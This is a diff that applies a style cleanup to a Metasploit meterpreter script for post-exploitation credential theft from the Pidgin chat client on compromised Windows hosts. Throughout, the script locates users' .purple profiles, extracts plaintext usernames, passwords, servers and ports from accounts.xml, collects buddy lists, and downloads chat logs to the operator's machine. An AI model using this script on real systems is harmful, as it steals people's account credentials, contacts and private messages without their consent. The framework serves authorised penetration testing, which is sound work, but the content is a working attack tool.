@@ -1,16 +1,16 @@
+# frozen_string_literal: true
 ##
 # WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
 # If you'd like to imporve this script, please try to port it as a post
 # module instead. Thank you.
 ##
 
-
 # Author: Carlos Perez at carlos_perez[at]darkoperator.com
 #-------------------------------------------------------------------------------
 require "rexml/document"
 
 #-------------------------------------------------------------------------------
-#Options and Option Parsing
+# Options and Option Parsing
 opts = Rex::Parser::Arguments.new(
   "-h" => [ false, "Help menu." ],
   "-c" => [ false, "Return credentials." ],
@@ -18,136 +18,127 @@ opts = Rex::Parser::Arguments.new(
   "-b" => [ false, "Retrieve buddies." ]
 )
 
-get_credentials=false
-get_buddies=false
-get_logs=false
-opts.parse(args) { |opt, idx, val|
+get_credentials = false
+get_buddies = false
+get_logs = false
+opts.parse(args) do |opt, _idx, _val|
   case opt
   when "-h"
     print_line "Meterpreter Script for extracting configured services with username and passwords."
     print_line(opts.usage)
     raise Rex::Script::Completed
   when "-l"
-    get_logs=true
+    get_logs = true
   when "-b"
-    get_buddies=true
+    get_buddies = true
   when "-c"
-    get_credentials=true
+    get_credentials = true
   end
-}
+end
 ### If we get here and have none of our flags true, then we'll just
 ###   get credentials
-if !(get_credentials || get_buddies || get_logs)
-  get_credentials=true
-end
+get_credentials = true unless get_credentials || get_buddies || get_logs
 
 #-------------------------------------------------------------------------------
-#Set General Variables used in the script
+# Set General Variables used in the script
 @client = client
 os = @client.sys.config.sysinfo['OS']
 host = @client.sys.config.sysinfo['Computer']
 # Create Filename info to be appended to downloaded files
 filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")
 # Create a directory for the logs
-logs = ::File.join(Msf::Config.log_directory,'scripts', 'pidgin_creds')
+logs = ::File.join(Msf::Config.log_directory, 'scripts', 'pidgin_creds')
 # Create the log directory
 ::FileUtils.mkdir_p(logs)
-#logfile name
+# logfile name
 dest = Rex::FileUtils.clean_path(logs + "/" + host + filenameinfo + ".txt")
 
 #-------------------------------------------------------------------------------
-#function for checking of Pidgin profile is present
+# function for checking of Pidgin profile is present
 def check_pidgin(path)
   found = nil
   @client.fs.dir.foreach(path) do |x|
     next if x =~ /^(\.|\.\.)$/
-    if x =~ (/\.purple/)
+    if x =~ /\.purple/
       ### If we find the path, let's return it
       found = path + x
       return found
     end
   end
-  return found
+  found
 end
 
 #-------------------------------------------------------------------------------
-#function for extracting the buddies
+# function for extracting the buddies
 def extract_buddies(path)
   blist_xml = ""
   buddies = ""
   print_status("Reading blist.xml file...")
   ### modified to use pidgin_path, which already has .purple in it
   blist_file = @client.fs.file.new(path + "\\blist.xml", "rb")
-  until blist_file.eof?
-    blist_xml << blist_file.read
-  end
+  blist_xml << blist_file.read until blist_file.eof?
   blist_file.close
   doc = (REXML::Document.new blist_xml).root
-  doc.elements["blist"].elements.each("group") {|group|
-    group.elements.each("contact") {|contact|
-      b_name=contact.elements["buddy"].elements["name"].text + ""
-      b_account=contact.elements["buddy"].attributes["account"] + ""
-      b_proto=contact.elements["buddy"].attributes["proto"] + ""
-      b_alias=""
-      if (contact.elements["buddy"].elements["alias"])
-        b_alias=contact.elements["buddy"].elements["alias"].text
+  doc.elements["blist"].elements.each("group") do |group|
+    group.elements.each("contact") do |contact|
+      b_name = contact.elements["buddy"].elements["name"].text + ""
+      b_account = contact.elements["buddy"].attributes["account"] + ""
+      b_proto = contact.elements["buddy"].attributes["proto"] + ""
+      b_alias = ""
+      if contact.elements["buddy"].elements["alias"]
+        b_alias = contact.elements["buddy"].elements["alias"].text
       end
       buddies << "buddy=>" + b_name + "\talias=>" + b_alias + "\taccount=>" + b_account + ":" + b_proto + "\n"
-    }
-  }
-  return buddies
-end
-
-#-------------------------------------------------------------------------------
-#function for downloading logs
-def download_logs(dest,pidgin_path)
-  begin
-    stat = client.fs.file.stat(pidgin_path+"\\logs")
-    if(stat.directory?)
-      print_status("downloading " + pidgin_path +"\\logs to " + dest+"/logs")
-      client.fs.dir.download(dest+"/logs", pidgin_path+"\\logs", true)
     end
-  rescue
-    print_status("Log directory does not exist, loggin is not enabled.")
   end
+  buddies
 end
 
 #-------------------------------------------------------------------------------
-#function for extracting the credentials
+# function for downloading logs
+def download_logs(dest, pidgin_path)
+  stat = client.fs.file.stat(pidgin_path + "\\logs")
+  if stat.directory?
+    print_status("downloading " + pidgin_path + "\\logs to " + dest + "/logs")
+    client.fs.dir.download(dest + "/logs", pidgin_path + "\\logs", true)
+  end
+rescue
+  print_status("Log directory does not exist, loggin is not enabled.")
+end
+
+#-------------------------------------------------------------------------------
+# function for extracting the credentials
 def extract_creds(path)
   accounts_xml = ""
   creds = ""
   print_status("Reading accounts.xml file...")
   ### modified to use pidgin_path, which already has .purple in it
   account_file = @client.fs.file.new(path + "\\accounts.xml", "rb")
-  until account_file.eof?
-    accounts_xml << account_file.read
-  end
+  accounts_xml << account_file.read until account_file.eof?
   account_file.close
   doc = (REXML::Document.new accounts_xml).root
-  doc.elements.each("account") {|element|
+  doc.elements.each("account") do |element|
     password = "<unknown>"
-    if element.elements["password"]
-      password=element.elements["password"].text
-    end
+    password = element.elements["password"].text if element.elements["password"]
 
-    print_status("\tProtocol: #{element.elements["protocol"].text}")
-    print_status("\tUsername: #{element.elements["name"].text}")
-    print_status("\tPassword: #{element.elements["password"].text}")
-    print_status("\tServer: #{element.elements["settings"].elements["setting[@name='server']"].text}")
-    print_status("\tPort: #{element.elements["settings"].elements["setting[@name='port']"].text}")
-    print_status()
+    print_status("\tProtocol: #{element.elements['protocol'].text}")
+    print_status("\tUsername: #{element.elements['name'].text}")
+    print_status("\tPassword: #{element.elements['password'].text}")
+    print_status("\tServer: #{element.elements['settings'].elements["setting[@name='server']"].text}")
+    print_status("\tPort: #{element.elements['settings'].elements["setting[@name='port']"].text}")
+    print_status
 
-    creds << "user=>#{element.elements["name"].text}"
+    creds << "user=>#{element.elements['name'].text}"
     creds << "\tpass=>#{password}"
-    creds << "\tserver=>#{element.elements["settings"].elements["setting[@name='server']"].text}"
-    creds << ":#{element.elements["settings"].elements["setting[@name='port']"].text}"
-    creds << "\tproto=>#{element.elements["protocol"].text}\n"
-  }
-  return creds
+    creds << "\tserver=>#{element.elements['settings'].elements["setting[@name='server']"].text}"
+    creds << ":#{element.elements['settings'].elements["setting[@name='port']"].text}"
+    creds << "\tproto=>#{element.elements['protocol'].text}\n"
+  end
+  creds
 end
+
 #-------------------------------------------------------------------------------
-#Function to enumerate the users if running as SYSTEM
+# Function to enumerate the users if running as SYSTEM
 def enum_users(os)
   users = []
 
@@ -178,7 +169,7 @@ def enum_users(os)
     userinfo['userappdata'] = path4users + uservar + path2purple
     users << userinfo
   end
-  return users
+  users
 end
 #-------------------------------------------------------------------------------
 
@@ -193,16 +184,12 @@ if client.platform =~ /win32|win64/
     if pidgin_path
       print_status("Pidgin profile found!")
       ### modified to use pidgin_path
-      if get_credentials
-        file_local_write(dest,extract_creds(pidgin_path))
-      end
+      file_local_write(dest, extract_creds(pidgin_path)) if get_credentials
       if get_buddies
-        file_local_write(dest,extract_buddies(pidgin_path))
+        file_local_write(dest, extract_buddies(pidgin_path))
         print_status("Buddie list has been saved to the log file.")
       end
-      if get_logs
-        download_logs(logs,pidgin_path)
-      end
+      download_logs(logs, pidgin_path) if get_logs
     else
       print_error("Pidgin profile not found!")
     end
